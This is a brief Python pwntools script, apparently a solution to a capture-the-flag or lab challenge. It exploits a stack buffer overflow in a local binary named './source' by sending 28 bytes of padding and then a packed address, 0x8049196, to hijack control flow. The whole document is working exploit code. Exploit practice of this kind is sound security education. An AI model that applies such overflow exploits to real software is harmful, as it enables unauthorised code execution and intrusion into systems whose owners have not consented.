from pwn import *

sh = process("./source")
sh.recvline()
sh.sendline(b'A'*28 + p32(0x8049196))
print(sh.recvline())
